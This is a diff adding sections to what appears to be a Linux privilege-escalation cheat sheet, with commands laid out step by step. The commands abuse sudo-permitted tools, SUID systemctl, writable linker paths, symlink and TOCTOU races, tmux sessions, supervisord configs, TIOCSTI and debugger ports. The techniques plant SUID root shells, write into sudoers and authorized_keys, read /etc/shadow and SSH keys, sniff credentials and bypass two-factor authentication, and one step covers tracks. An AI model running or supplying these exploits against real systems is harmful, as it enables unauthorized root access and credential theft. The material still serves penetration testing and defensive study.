+### 4.17k Sudo adduser — Group Name Collision Privilege Escalation
+
+When `sudo -l` shows NOPASSWD on `/usr/sbin/adduser`, creating a user with the same name as an existing privileged group (admin/sudo/wheel) causes `adduser` to assign that group as the new user's primary group instead of creating a new one.
+
+```bash
+# Detect
+sudo -l | grep adduser
+
+# Check existing privileged groups
+grep -E '^(admin|sudo|wheel):' /etc/group
+
+# Exploit: create user named after the sudo/admin group
+# If 'admin' group exists and grants sudo-like access:
+sudo adduser admin
+# adduser sees group 'admin' already exists → assigns it as primary group
+# New user 'admin' inherits all permissions of the 'admin' group
+
+# Set password when prompted, then switch to the new user
+su - admin
+sudo -i   # if admin group has sudoers entry
+
+# Alternative: target 'sudo' group directly (if it exists)
+sudo adduser sudo
+su - sudo
+sudo -i
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# adduser is the native user-creation tool — fully LOTL
+# The exploit relies on adduser's default behavior of reusing existing group names
+# Verify the group grants privilege before creating the user:
+grep admin /etc/sudoers /etc/sudoers.d/* 2>/dev/null
+```
+
+### 4.17l Sudo Chef knife — Ruby Execution Primitives
+
+When `sudo -l` shows NOPASSWD on `/usr/bin/knife`, knife's `exec` subcommand evaluates arbitrary Ruby code, and the `-e` (editor) flag on various subcommands can invoke a shell.
+
+```bash
+# Detect
+sudo -l | grep knife
+
+# Method 1: knife exec — direct Ruby eval as root
+sudo knife exec -E 'exec "/bin/bash"'
+
+# Method 2: knife exec with system() for payload
+sudo knife exec -E 'system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")'
+
+# Method 3: knife node/data bag create with editor escape
+export EDITOR='/bin/bash'
+sudo knife data bag create pwn item
+
+# Method 4: knife -c (config file) — Ruby is valid config
+cat > /tmp/knife.rb <<'EOF'
+system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
+EOF
+sudo knife -c /tmp/knife.rb node list
+
+# Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# knife is the tool itself; exec -E is the simplest path — no files needed
+sudo knife exec -E 'exec "/bin/sh"'
+```
+
+### 4.17m Sudo Desktop/CAD Application — Post-Processing Script Abuse
+
+When `sudo -l` shows NOPASSWD on desktop applications that support project-file-embedded scripts (PrusaSlicer, LibreOffice, Inkscape), the project file format itself contains executable code that runs as root when the application processes it.
+
+```bash
+# Detect
+sudo -l | grep -iE "prusa|slic3r|libreoffice|soffice|inkscape"
+
+# === PrusaSlicer / SuperSlicer ===
+# .3mf project files embed post-processing scripts in the config
+mkdir -p /tmp/pwn3mf/Metadata
+cat > /tmp/pwn3mf/Metadata/Slic3r_PE.config <<'EOF'
+; post_process = /tmp/pwn.sh
+post_process = cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash;
+EOF
+cd /tmp/pwn3mf && zip -r /tmp/evil.3mf .
+sudo prusa-slicer --export-gcode /tmp/evil.3mf
+
+# === LibreOffice ===
+# Macros run via --headless when sudo'd
+cat > /tmp/macro.py <<'EOF'
+import os
+def pwn(*args):
+    os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
+    return None
+EOF
+sudo libreoffice --headless --invisible "macro:///Standard.Module1.pwn" /tmp/doc.odt
+
+# === Inkscape ===
+# Extensions execute Python scripts; --verb triggers processing
+cat > /tmp/evil.svg <<'EOF'
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg"></svg>
+EOF
+sudo inkscape /tmp/evil.svg --export-filename=/tmp/out.png --actions="org.inkscape.effect.exec;/tmp/pwn.sh"
+
+# Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# The application itself is the execution engine — only file creation (cat/echo) needed
+# PrusaSlicer: post_process directive in .3mf config = shell command
+# LibreOffice: --headless macro invocation requires no GUI
+# Inkscape: extension system processes from extension dirs
+```
+
+### 4.17n Sudo Python Script — pdb.post_mortem Shell Escape
+
+When `sudo -l` shows NOPASSWD on a specific Python script, trigger an unhandled exception to land in Python's debugger (pdb), then escape to an interactive shell as root.
+
+```bash
+# Detect
+sudo -l | grep "python"
+# Look for: (root) NOPASSWD: /usr/bin/python3 /opt/app/script.py
+
+# Method 1: Force an exception + PYTHONSTARTUP to inject pdb auto-start
+cat > /tmp/pdb_hook.py <<'EOF'
+import pdb, sys
+def excepthook(t, v, tb):
+    pdb.post_mortem(tb)
+sys.excepthook = excepthook
+EOF
+sudo PYTHONSTARTUP=/tmp/pdb_hook.py /usr/bin/python3 /opt/app/script.py <INVALID_INPUT>
+
+# Method 2: python -m pdb (if sudoers allows python3 + script path)
+sudo /usr/bin/python3 -m pdb /opt/app/script.py
+# At (Pdb) prompt:
+# (Pdb) import os; os.system("/bin/bash")
+
+# Method 3: PYTHONBREAKPOINT env var (if env_keep includes it)
+sudo PYTHONBREAKPOINT=os.system /usr/bin/python3 /opt/app/script.py
+# When script hits breakpoint() → os.system() is called
+
+# At any (Pdb) prompt — root shell escape:
+# (Pdb) import os; os.setuid(0); os.system("/bin/bash")
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Python ships with pdb in stdlib — no pip install needed
+# Simplest escape once at (Pdb) prompt:
+# import os; os.system("/bin/sh")
+# Or: os.execv("/bin/sh", ["/bin/sh"])
+```
+
+### 4.18 SUID systemctl — Link Unit File Privesc (GTFOBins)
+
+When `systemctl` is SUID-root, `systemctl link` allows symlinking a user-controlled `.service` file into the systemd unit tree, then starting it executes arbitrary commands as root.
+
+```bash
+# Detect
+find / -name "systemctl" -perm -4000 2>/dev/null
+ls -la /bin/systemctl /usr/bin/systemctl
+
+# Step 1: Create a malicious service file in a user-writable location
+cat > /tmp/pwn.service <<'EOF'
+[Unit]
+Description=pwn
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Step 2: Link the unit file into systemd's search path
+/bin/systemctl link /tmp/pwn.service
+
+# Step 3: Start the service (SUID systemctl runs this as root)
+/bin/systemctl start pwn.service
+
+# Step 4: Enable + start if 'start' alone doesn't work
+/bin/systemctl enable --now /tmp/pwn.service
+
+# Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# systemctl is the SUID binary itself — fully native
+# Only need cat/echo to create the .service file
+# Alternative: use systemctl's pager escape if output is long enough:
+SYSTEMD_PAGER='/bin/bash' /bin/systemctl status
+```
+
+### 4.18b SUID Binary Symlink-to-Predictable-Filename — Arbitrary File Read
+
+When a SUID binary reads from or writes to a predictable filename (time-based, PID-based, or relative-path), replace the target path with a symlink to redirect the I/O to a sensitive file.
+
+```bash
+# Step 1: Identify the predictable filename via strace/ltrace
+strace -f -e openat,access,stat <SUID_BINARY> 2>&1 | grep -E "/tmp|/var/tmp|\.log|\.pid"
+ltrace <SUID_BINARY> 2>&1 | grep -E "fopen|open|access"
+
+# Pattern A: Time-based filename (e.g., /tmp/app_YYYYMMDD.log)
+ln -sf /etc/shadow /tmp/app_$(date +%Y%m%d).log
+<SUID_BINARY>   # reads/writes through your symlink
+
+# Pattern B: Relative-path filename (e.g., ./output.txt in CWD)
+mkdir /tmp/exploit && cd /tmp/exploit
+ln -sf /etc/shadow ./output.txt
+<SUID_BINARY>   # opens ./output.txt → follows symlink → reads /etc/shadow as root
+cat output.txt 2>/dev/null
+
+# Pattern C: PID-based filename (e.g., /tmp/app_$PID.tmp)
+# Spray symlinks covering likely PID range
+while true; do
+  for pid in $(seq 30000 30100); do
+    ln -sf /etc/shadow /tmp/app_${pid}.tmp 2>/dev/null
+  done
+done &
+<SUID_BINARY>
+kill %1
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# ln -sf is the only tool needed — ships with coreutils
+# strace/ltrace for discovery; if unavailable, use strings to find path patterns:
+strings <SUID_BINARY> | grep -E "/tmp/|/var/tmp/|\./|%d|%s"
+```
+
+### 4.18c SUID Library Hijack via Writable /etc/ld.so.conf.d Search-Path Entry
+
+When a directory listed in `/etc/ld.so.conf.d/*.conf` is writable, place a same-named shared library to shadow the real one. Any SUID binary that loads that library via the linker search path will execute your code as root.
+
+```bash
+# Step 1: Enumerate linker search paths and check writability
+cat /etc/ld.so.conf
+cat /etc/ld.so.conf.d/*.conf
+for dir in $(cat /etc/ld.so.conf.d/*.conf 2>/dev/null | grep -v "^#"); do
+  [ -w "$dir" ] && echo "[!] WRITABLE: $dir"
+done
+
+# Step 2: Identify which libraries SUID binaries load from that path
+find / -perm -4000 -type f 2>/dev/null | while read bin; do
+  ldd "$bin" 2>/dev/null | grep "$WRITABLE_DIR"
+done
+
+# Step 3: Build malicious shared library with matching SONAME
+cat > /tmp/evil.c <<'EOF'
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+__attribute__((constructor))
+void pwn(void) {
+    if (getuid() != 0) return;
+    setuid(0); setgid(0);
+    system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash");
+}
+EOF
+gcc -shared -fPIC -Wl,-soname,<LIBNAME>.so.<VERSION> -o <WRITABLE_DIR>/<LIBNAME>.so.<VERSION> /tmp/evil.c
+
+# Step 4: Refresh the linker cache
+ldconfig  # if you can run it; otherwise wait for root cron or reboot
+
+# Step 5: Trigger the SUID binary
+<SUID_BINARY>
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# gcc is needed for compilation — no pure LOTL alternative for .so creation
+# If gcc is unavailable on target, compile on attacker and transfer the .so
+# Discovery is fully LOTL:
+cat /etc/ld.so.conf.d/*.conf | while read d; do test -w "$d" && echo "WRITABLE: $d"; done
+```
+
+### 4.18d SUID TOCTOU Race — access()/stat() Check Then open() Symlink Swap
+
+When a SUID binary checks file permissions with `access()` or `stat()`, then opens the file in a separate call, there is a race window to swap the file for a symlink to a privileged target.
+
+```bash
+# Step 1: Identify the TOCTOU pattern via strace
+strace -f -e access,stat,lstat,openat <SUID_BINARY> /tmp/testfile 2>&1
+# Vulnerable: access("/tmp/testfile", R_OK) = 0 → openat("/tmp/testfile", ...)
+# The gap between access() and openat() is the race window
+
+# Step 2: Set up the race — loop swapping between legit file and symlink
+echo "legit" > /tmp/legit && chmod 644 /tmp/legit
+while true; do
+  ln -sf /etc/shadow /tmp/testfile
+  ln -sf /tmp/legit  /tmp/testfile
+done &
+
+# Step 3: Continuously invoke the SUID binary
+while true; do
+  <SUID_BINARY> /tmp/testfile 2>/tmp/output
+  grep -q "root:" /tmp/output && break
+done
+kill %1
+
+# Step 4: Using inotifywait for more reliable wins
+cat > /tmp/race.sh <<'EOF'
+#!/bin/bash
+while true; do
+  echo "legit" > /tmp/testfile
+  inotifywait -qq -e access /tmp/testfile 2>/dev/null
+  ln -sf /etc/shadow /tmp/testfile
+done
+EOF
+chmod +x /tmp/race.sh
+/tmp/race.sh &
+<SUID_BINARY> /tmp/testfile
+kill %1
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# ln -sf loop is fully LOTL (coreutils)
+# inotifywait requires inotify-tools (often installed)
+# Without inotifywait, tight bash loop is the fallback:
+while true; do ln -sf /etc/shadow /tmp/f; ln -sf /tmp/ok /tmp/f; done &
+```
+
+### 4.19 Tmux / GNU Screen Shared-Session Hijack
+
+When a root (or higher-privilege) user has a detached tmux/screen session with permissive socket/directory permissions, attaching to it gives you their shell.
+
+```bash
+# === TMUX ===
+
+# Detect tmux sockets accessible to current user
+find /tmp/tmux-* -type s 2>/dev/null
+ls -la /tmp/tmux-*/
+
+# Check running tmux sessions owned by other users
+ps aux | grep tmux | grep -v grep
+
+# If socket is world-readable/writable or group-accessible:
+ls -la /tmp/tmux-0/default    # tmux-<UID>/default is the socket path
+
+# Attach to root's session
+tmux -S /tmp/tmux-0/default attach
+
+# If tmux says "sessions should be nested" — unset TMUX first:
+unset TMUX && tmux -S /tmp/tmux-0/default attach
+
+# === GNU SCREEN ===
+
+# Detect screen sessions
+screen -ls              # shows your sessions
+ls -la /var/run/screen/ # directory per user
+ls -la /run/screen/
+
+# Find other users' screen sessions
+find /var/run/screen /run/screen -type d 2>/dev/null
+ls -la /var/run/screen/S-root/ 2>/dev/null
+
+# Check for multiuser mode (allows attachment by other users)
+screen -x root/<SESSION_NAME>
+
+# If screen is SUID and you're in the session's group:
+screen -r root/<SESSION_NAME>
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# tmux and screen are standard terminal multiplexers — no downloads
+# Detection is just ls + find; exploitation is just attaching
+# Key check: socket permissions must allow your user to connect
+stat /tmp/tmux-0/default 2>/dev/null
+```
+
+### 4.19b TOTP/Google Authenticator Secret-to-OTP — Bypass SSH 2FA
+
+When Google Authenticator (PAM) secrets are readable (leaked config, backup file, readable `~/.google_authenticator`), generate valid TOTP codes to bypass SSH two-factor authentication. See also section 5.1he for the full credential-extraction workflow.
+
+```bash
+# Step 1: Find leaked TOTP secrets
+find / -name ".google_authenticator" -readable 2>/dev/null
+cat /home/<USER>/.google_authenticator
+# First line = base32 secret; last 5 lines = emergency scratch codes
+
+# Also check backups and provisioning scripts
+grep -r "google_authenticator\|totp\|oathtool" /var/backups /opt /etc 2>/dev/null
+
+# Step 2: Generate a valid OTP from the secret
+oathtool --totp --base32 <SECRET>
+
+# Step 3: Use the code for SSH login
+ssh <USER>@<TARGET>
+# Enter password → then enter the generated 6-digit OTP
+
+# Step 4: If oathtool unavailable, use Python stdlib
+python3 -c "
+import hmac, struct, time, base64, hashlib
+secret = base64.b32decode('<SECRET>')
+counter = int(time.time()) // 30
+h = hmac.new(secret, struct.pack('>Q', counter), hashlib.sha1).digest()
+o = h[-1] & 0xf
+code = (struct.unpack('>I', h[o:o+4])[0] & 0x7fffffff) % 1000000
+print(f'{code:06d}')
+"
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Python3 stdlib generates valid TOTP — no pip install needed
+# oathtool (oath-toolkit) is the binary alternative
+# Emergency scratch codes require no computation — use directly
+oathtool --totp --base32 '<SECRET>'
+```
+
+### 4.19c tcpdump Credential Harvesting — Post-Compromise Packet Sniffing
+
+After compromising a host (with `cap_net_raw` capability or root), sniff loopback/network traffic to harvest cleartext credentials from local services.
+
+```bash
+# Check if tcpdump is available and if you have cap_net_raw
+which tcpdump
+getcap $(which tcpdump) 2>/dev/null
+
+# Sniff HTTP Basic Auth on all interfaces
+tcpdump -i any -A -s 0 'tcp port 80 or tcp port 8080' 2>/dev/null | grep -iE "Authorization:|password=|passwd=|pass="
+
+# Sniff FTP credentials (port 21)
+tcpdump -i any -A -s 0 'tcp port 21' 2>/dev/null | grep -iE "USER |PASS "
+
+# Sniff SMTP/POP3/IMAP credentials
+tcpdump -i any -A -s 0 'tcp port 25 or tcp port 110 or tcp port 143' 2>/dev/null | grep -iE "USER |PASS |AUTH"
+
+# Sniff loopback traffic (internal services talking to DB/API)
+tcpdump -i lo -A -s 0 'tcp' 2>/dev/null | grep -iE "password|passwd|secret|token|auth"
+
+# Capture to file for offline analysis (quieter)
+tcpdump -i any -w /tmp/cap.pcap -c 10000 'not port 22' &
+# Later: strings /tmp/cap.pcap | grep -iE 'password|pass=|Authorization'
+
+# MySQL protocol sniffing (port 3306)
+tcpdump -i lo -A -s 0 'tcp port 3306' 2>/dev/null | strings | grep -iE "root|admin|password"
+
+# Redis AUTH (port 6379 — plaintext)
+tcpdump -i lo -A -s 0 'tcp port 6379' 2>/dev/null | grep -i "AUTH "
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# tcpdump ships with most Linux installs — fully LOTL
+# If tcpdump is unavailable: check for existing pcap files on the host
+find / -name "*.pcap" -o -name "*.cap" 2>/dev/null | xargs strings 2>/dev/null | grep -i pass
+# /proc/net/tcp shows connections but not payload
+```
+
+### 4.20 Symlink in World-Writable Directory — Redirect Privileged Process Writes
+
+When a root-owned process writes to a predictable path inside a world-writable directory (`/tmp`, `/var/tmp`, `/dev/shm`), replace the target with a symlink to redirect the write to an arbitrary location.
+
+```bash
+# Step 1: Identify privileged processes writing to world-writable dirs
+inotifywait -m -r /tmp/ -e create,modify 2>&1 | grep -v "\.swp"
+# Or: find /tmp /var/tmp /dev/shm -user root -newer /tmp/.marker 2>/dev/null
+
+# Step 2: Identify the predictable filename pattern
+ls -la /tmp/ | grep root   # files owned by root in /tmp
+
+# Step 3: Remove the file and replace with symlink
+rm -f /tmp/<PREDICTABLE_FILE>
+ln -sf /root/.ssh/authorized_keys /tmp/<PREDICTABLE_FILE>
+# Root process writes → content lands in authorized_keys
+
+# Step 4: For cron.d injection (content must be valid cron):
+rm -f /tmp/<PREDICTABLE_FILE>
+ln -sf /etc/cron.d/pwn /tmp/<PREDICTABLE_FILE>
+
+# Step 5: For processes that create files (not overwrite existing)
+while true; do
+  rm -f /tmp/<PREDICTABLE_FILE>
+  ln -sf /etc/sudoers.d/pwn /tmp/<PREDICTABLE_FILE>
+  sleep 0.01
+done &
+# Wait for root process → verify:
+cat /etc/sudoers.d/pwn
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# ln -sf and rm are coreutils — fully LOTL
+# inotifywait (inotify-tools) improves reliability but tight loop works without it
+# Discovery: find /tmp -user root 2>/dev/null
+```
+
+### 4.20b Symlink Abuse Against Privileged Script Reading Fixed Log Path
+
+When a privileged script (root cron, systemd service) reads from a hardcoded file path, and the parent directory is writable by the attacker, replace the file with a symlink to read or influence arbitrary files.
+
+```bash
+# Step 1: Identify the pattern
+grep -rE "cat |head |tail |less |wc |grep " /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
+find /opt /usr/local -name "*.sh" -exec grep -lE "cat /|< /" {} \; 2>/dev/null
+
+# Step 2: Confirm the parent directory is writable
+ls -ld $(dirname <FIXED_LOG_PATH>)
+
+# Step 3: Replace with symlink to target file
+rm -f <FIXED_LOG_PATH>
+ln -sf /etc/shadow <FIXED_LOG_PATH>
+
+# Step 4: The privileged script reads through the symlink
+# If the script outputs/processes the content (email, dashboard, another log):
+cat <OUTPUT_LOCATION>   # contains /etc/shadow content
+
+# Step 5: For write redirects (script writes to the log path)
+rm -f <FIXED_LOG_PATH>
+ln -sf /root/.ssh/authorized_keys <FIXED_LOG_PATH>
+# Script appends → controlled content lands in root's authorized_keys
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# rm + ln -sf are coreutils — fully LOTL
+# Key requirement: writable parent directory of the hardcoded path
+test -w $(dirname <FIXED_LOG_PATH>) && echo "exploitable"
+```
+
+### 4.20c Symlink Swap on tar Source Directory — Root chmod -R Exploitation
+
+When a root cron job creates a tar archive from a user-owned directory and then applies `chmod -R` on extracted content, replace the source directory with a symlink to `/root` between the tar creation and the chmod operation.
+
+```bash
+# Step 1: Identify the pattern in root cron/scripts
+grep -rE "(tar|chmod|chown).*-[Rr]" /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
+cat /etc/crontab | grep -E "tar|backup|chmod"
+
+# Step 2: Understand the timing
+# Typical: tar cf archive user-dir → tar xf → chmod -R 777 extracted/
+
+# Step 3: Replace source directory with symlink to privileged path
+mv /home/<USER>/data /home/<USER>/data.bak
+ln -sf /root /home/<USER>/data
+
+# tar follows symlinks → archive contains /root/* contents
+# chmod -R 777 on extracted content → /root files become world-readable
+
+# Step 4: Collect
+cat /root/.ssh/id_rsa 2>/dev/null || cat /tmp/verify/root/.ssh/id_rsa
+
+# Step 5: Restore original to avoid detection
+rm /home/<USER>/data
+mv /home/<USER>/data.bak /home/<USER>/data
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# mv + ln -sf are coreutils — fully LOTL
+# tar follows symlinks by default; no special flags needed by attacker
+```
+
+### 4.21 TOCTOU Race — Sudo Script with Predictable Temp File
+
+When a root-run (sudo) bash script creates a temporary file with a predictable name (e.g., `/tmp/script_$$`, `/tmp/app.tmp`), race to replace it with a symlink between creation and use, redirecting reads/writes to arbitrary files.
+
+```bash
+# Step 1: Identify the predictable temp file
+cat <SCRIPT_PATH> | grep -E '/tmp/|/var/tmp/|mktemp'
+# Vulnerable: /tmp/fixed_name or /tmp/${something_predictable}
+# Safe: mktemp (random suffix) — much harder to race
+
+# Step 2: Hot-loop symlink replacement
+while true; do
+  rm -f /tmp/app.tmp
+  ln -sf /etc/sudoers.d/pwn /tmp/app.tmp
+done &
+RACE_PID=$!
+
+# Step 3: Trigger the sudo script repeatedly
+for i in $(seq 1 100); do
+  sudo /opt/app/vulnerable_script.sh 2>/dev/null
+done
+kill $RACE_PID
+
+# Step 4: Check if the race succeeded
+cat /etc/sudoers.d/pwn 2>/dev/null
+
+# Step 5: inotifywait-based precision race
+cat > /tmp/race.sh <<'EOF'
+#!/bin/bash
+while true; do
+  inotifywait -qq -e create /tmp/ 2>/dev/null
+  rm -f /tmp/app.tmp
+  ln -sf /etc/sudoers.d/pwn /tmp/app.tmp
+done
+EOF
+chmod +x /tmp/race.sh
+/tmp/race.sh &
+sudo /opt/app/vulnerable_script.sh
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# rm + ln -sf + bash loop = fully LOTL
+# inotifywait improves win rate but is optional
+while true; do ln -sf /etc/sudoers.d/pwn /tmp/app.tmp 2>/dev/null; done &
+```
+
+### 4.21b TOCTOU Race — Root Extract-and-Diff Workflow (Archive Replacement)
+
+When a root cron/script creates a tar archive, sleeps or processes, then extracts it, replace the archive mid-sleep to plant a SUID binary in the extraction output.
+
+```bash
+# Step 1: Identify the pattern
+grep -rE "tar.*cf|sleep|tar.*xf" /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
+# Vulnerable: tar cf /tmp/backup.tar → sleep → tar xf /tmp/backup.tar -C /tmp/verify/
+
+# Step 2: Create malicious archive with SUID binary
+cp /bin/bash /tmp/rootbash_src
+chmod u+s /tmp/rootbash_src
+tar cf /tmp/evil.tar --transform='s|rootbash_src|rootbash|' /tmp/rootbash_src
+
+# Step 3: Race — replace archive between create and extract
+cat > /tmp/race_tar.sh <<'EOF'
+#!/bin/bash
+while true; do
+  inotifywait -qq -e close_write /tmp/backup.tar 2>/dev/null
+  cp /tmp/evil.tar /tmp/backup.tar
+done
+EOF
+chmod +x /tmp/race_tar.sh
+/tmp/race_tar.sh &
+
+# Wait for cron → tar creates backup.tar → script replaces it → tar extracts evil
+
+# Step 4: Check extraction directory for SUID binary
+ls -la /tmp/verify/rootbash
+/tmp/verify/rootbash -p
+# Note: root tar extract preserves SUID bit (--same-permissions is default for root)
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# tar + cp + bash loop = fully LOTL
+# Without inotifywait, monitor file mtime in loop:
+while true; do
+  [ /tmp/backup.tar -nt /tmp/.marker ] && cp /tmp/evil.tar /tmp/backup.tar && touch /tmp/.marker
+  sleep 0.1
+done &
+```
+
+### 4.21c TOCTOU Symlink Race Against Sudo Script — Check-Move-Read Pattern
+
+When a sudo-permitted script validates a file, moves it, then reads it as root (quarantine/approval pattern), swap the symlink target between the validation and read phases.
+
+```bash
+# Step 1: Understand the vulnerable script flow
+# Typical: test -f /upload/file → mv to /approved/ → cat /approved/file (as root)
+# Attack: make /upload/file a symlink; swap target between check and read
+
+# Step 2: Set up the race
+echo "safe content" > /tmp/safe.txt
+ln -sf /tmp/safe.txt /upload/file.txt
+
+# Step 3: Hot-loop to swap symlink target after validation
+cat > /tmp/race_symlink.sh <<'EOF'
+#!/bin/bash
+while true; do
+  inotifywait -qq -e access /tmp/safe.txt 2>/dev/null
+  ln -sf /etc/shadow /upload/file.txt
+done
+EOF
+chmod +x /tmp/race_symlink.sh
+/tmp/race_symlink.sh &
+
+# Step 4: Trigger the sudo script
+sudo /opt/app/process_upload.sh
+# Script validates → sees safe content → reads... but symlink now points to /etc/shadow
+
+# Step 5: Check output location for leaked content
+cat /var/log/app/processed.log | grep root:
+kill %1
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# ln -sf + inotifywait (or tight loop) = mostly LOTL
+# Without inotifywait:
+while true; do ln -sf /etc/shadow /upload/file.txt; ln -sf /tmp/safe.txt /upload/file.txt; done &
+```
+
+### 4.22 supervisord Config Hijack — Root Code Execution via [program:*]
+
+When supervisord is running as root and its config includes a writable `include` glob (e.g., `/etc/supervisor/conf.d/*.conf` with world-writable directory), writing a new `[program:*]` section yields root code execution.
+
+```bash
+# Step 1: Detect supervisord running as root
+ps aux | grep supervisord | grep -v grep
+
+# Step 2: Check config include path for writability
+cat /etc/supervisor/supervisord.conf | grep -A2 "\[include\]"
+# Look for: files = /etc/supervisor/conf.d/*.conf
+ls -ld /etc/supervisor/conf.d/ /etc/supervisord.d/ 2>/dev/null
+
+# Step 3: Write malicious program config
+cat > /etc/supervisor/conf.d/pwn.conf <<'EOF'
+[program:pwn]
+command=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
+autostart=true
+autorestart=false
+user=root
+EOF
+
+# Step 4: Reload supervisord to pick up new config
+supervisorctl reread && supervisorctl update
+# Or if supervisorctl requires auth:
+kill -HUP $(pgrep supervisord)   # SIGHUP triggers config reload
+
+# Collect
+/tmp/rootbash -p
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# cat/echo for config creation + supervisorctl (ships with supervisor) = LOTL
+# If supervisorctl is restricted, SIGHUP to supervisord PID triggers reload
+# No downloads needed — exploit is purely config manipulation
+```
+
+### 4.22b TIOCSTI PTY Input Injection — Shared Terminal Privilege Escalation
+
+When two users share a PTY (e.g., `su` without `-l`, `sudo -s` from another user's terminal), the TIOCSTI ioctl pushes characters into the terminal's input queue — executing commands as the other user when you exit.
+
+```bash
+# Step 1: Check if TIOCSTI is available (disabled in kernel 6.2+ by default)
+cat /proc/sys/dev/tty/legacy_tiocsti 2>/dev/null
+# 1 = enabled, 0 = disabled
+# File doesn't exist → kernel < 6.2, TIOCSTI is available
+
+# Step 2: Identify shared PTY scenario
+# After 'su user2' (without -l or -), both users share the same PTY
+tty   # shows /dev/pts/X — same as parent
+
+# Step 3: Inject commands via TIOCSTI using Python
+python3 -c "
+import fcntl, termios, sys
+cmd = 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n'
+for c in cmd:
+    fcntl.ioctl(sys.stdin, termios.TIOCSTI, c.encode())
+"
+# Command appears in PARENT shell's input queue
+# When you exit back to parent shell → command auto-executes
+
+# Step 4: Perl variant
+perl -e 'require "sys/ioctl.ph"; foreach $c (split //, "id > /tmp/proof\n") { ioctl(STDIN, &TIOCSTI, $c); }'
+
+# Step 5: C variant
+cat > /tmp/inject.c <<'EOF'
+#include <sys/ioctl.h>
+#include <stdio.h>
+int main() {
+    char *cmd = "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n";
+    while (*cmd) ioctl(0, TIOCSTI, cmd++);
+    return 0;
+}
+EOF
+gcc -o /tmp/inject /tmp/inject.c && /tmp/inject
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# Python3 or Perl (usually installed) provide the ioctl call
+# No external tools needed — the kernel's TIOCSTI is the primitive
+# Modern mitigation: kernel 6.2+ has dev.tty.legacy_tiocsti=0 by default
+sysctl dev.tty.legacy_tiocsti 2>/dev/null
+```
+
+### 4.22c Node.js / Electron / CEF Debugger Exploitation — Cross-Platform CDP Abuse
+
+Extends section 4.11b to cover Electron / CEF processes exposing Chrome DevTools Protocol on debug ports. When another user's Electron app (VS Code, Slack, etc.) runs with `--remote-debugging-port`, connect and execute code as that user.
+
+```bash
+# === Linux Detection ===
+ps aux | grep -E "\-\-remote-debugging-port|\-\-inspect" | grep -v grep
+ss -tlnp | grep -E "9222|9229|9230"  # common debug ports
+
+# Find Electron apps storing debug port in runtime files
+find /tmp -name "DevToolsActivePort" 2>/dev/null
+find /home/*/.config -name "DevToolsActivePort" 2>/dev/null
+
+# Enumerate discoverable debug targets
+curl -s http://127.0.0.1:9222/json
+
+# === Exploitation (same CDP as Node.js --inspect) ===
+node -e "
+var ws = new (require('ws'))('ws://127.0.0.1:9222/devtools/page/<TARGET_ID>');
+ws.on('open', function(){
+  ws.send(JSON.stringify({id:1, method:'Runtime.evaluate',
+    params:{expression:'require(\"child_process\").execSync(\"id\").toString()'}}));
+});
+ws.on('message', function(d){ console.log(d.toString()); process.exit(); });
+"
+
+# === Windows-specific (cefdebug.exe) ===
+# cefdebug.exe --scan
+# cefdebug.exe --url ws://127.0.0.1:9222/<PATH> --code "process.mainModule.require('child_process').execSync('whoami')"
+
+# === VS Code Server (common on Linux dev boxes) ===
+find /tmp -path "*vscode*" -name "*.json" 2>/dev/null | xargs grep -l "port" 2>/dev/null
+curl -s http://127.0.0.1:<PORT>/json 2>/dev/null
+```
+
+#### Living-off-the-land / LOTL variant
+
+```bash
+# curl for discovery (installed everywhere) + node for WebSocket exploitation
+# Without node: python3 with http.client handles HTTP discovery but not WebSocket
+# Minimal LOTL: discovery via curl, exploitation requires node or python3 websockets
+curl -s http://127.0.0.1:9222/json | grep webSocketDebuggerUrl
+```
 
 ---
 
@@ -2760,6 +5912,24 @@ cat /root/.ssh/id_rsa
 cat /home/*/.bash_history
 cat /root/.bash_history
 cat /home/*/.mysql_history
+
+# Editor / REPL history (often contains admin commands, passwords, file paths)
+cat /home/*/.viminfo /root/.viminfo 2>/dev/null          # vim registers, file marks, command/search history
+cat /home/*/.lesshst /root/.lesshst 2>/dev/null          # less search history (may reveal grepped secrets)
+cat /home/*/.python_history /root/.python_history 2>/dev/null
+cat /home/*/.psql_history /root/.psql_history 2>/dev/null
+cat /home/*/.sqlite_history /root/.sqlite_history 2>/dev/null
+cat /home/*/.dbshell /root/.dbshell 2>/dev/null          # mongo shell history
+cat /home/*/.rediscli_history /root/.rediscli_history 2>/dev/null
+
